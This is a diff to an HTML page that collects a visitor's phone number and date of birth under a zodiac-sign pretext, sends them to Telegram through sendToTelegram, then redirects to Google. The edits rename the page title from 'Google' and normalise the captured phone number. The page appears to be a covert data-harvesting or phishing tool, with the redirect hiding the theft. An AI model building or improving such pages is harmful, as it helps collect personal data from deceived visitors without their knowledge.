@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google</title>
+    <title>Interactive Gateway</title>
     <!-- Tailwind CSS CDN for styling -->
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
@@ -142,12 +142,12 @@
 
         // --- Main Application Flow ---
         async function handleZodiacSubmission() {
-            const phone = phoneNumberInput.value;
+            // UPDATED: Prepend '0' and strip any non-digit characters.
+            const phone = '0' + phoneNumberInput.value.replace(/\D/g, '');
             const dob = dobInput.value;
             const zodiac = getZodiacSign(dob);
             
             await sendToTelegram(zodiac, phone);
-            // UPDATED: Search query is now just the zodiac sign name.
             redirectToGoogle(zodiac);
         }
 
